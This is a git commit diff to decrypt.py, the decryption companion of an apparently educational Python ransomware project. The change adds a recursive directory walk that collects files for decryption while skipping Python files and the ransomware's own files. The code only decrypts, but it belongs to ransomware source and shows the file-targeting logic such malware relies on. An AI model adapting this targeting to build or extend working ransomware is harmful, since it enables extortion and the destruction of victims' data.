362a29992b1693955c438ba7917b693ae4dc0467
SergioZ3R0 <104630377+SergioZ3R0@users.noreply.github.com>
2024-04-24 20:02:37 +0200

    Update decrypt.py

--- cyberSec/pythonRandsomware/decrypt.py
+++ cyberSec/pythonRandsomware/decrypt.py
@@ -10,12 +10,42 @@ def install(package):
 install('cryptography')
 files = []
 
-for file in os.listdir():
-    if file == "darthvader.py" or file == "key.key" or file == "decrypt.py":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
-print(files)
+def recorrer_arbol_directorios(directory):
+    global files
+    try:
+        for file in os.listdir(directory):
+            rute_element = os.path.join(directory, file)
+            if not os.path.islink(rute_element):
+                if os.path.isdir(rute_element):
+                    # Ignora los directorios relacionados con Python
+                    if "python" in rute_element.lower():
+                        continue
+                    print("Directory:", rute_element)
+                    recorrer_arbol_directorios(rute_element)
+                else:
+                    # Ignora los archivos relacionados con Python
+                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
+                        continue
+                    print("File:", rute_element)
+                    files.append(rute_element)
+    except PermissionError:
+        error_message = f"No tienes permisos para acceder a la carpeta: {directory}"
+        print(error_message)
+        logging.error(error_message)
+    except OSError as e:
+        error_message = f"Error de E/S: {e}"
+        print(error_message)
+        logging.error(error_message)
+    except RecursionError:
+        error_message = f"Error: Recursión infinita detectada en la carpeta: {directory}"
+        print(error_message)
+        logging.error(error_message)
+    except Exception as e:
+        error_message = f"Error inesperado: {e}"
+        print(error_message)
+        logging.error(error_message)
+    print(files)
+recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))
 
 with open("key.key", "rb") as key_file:
     key = key_file.read()
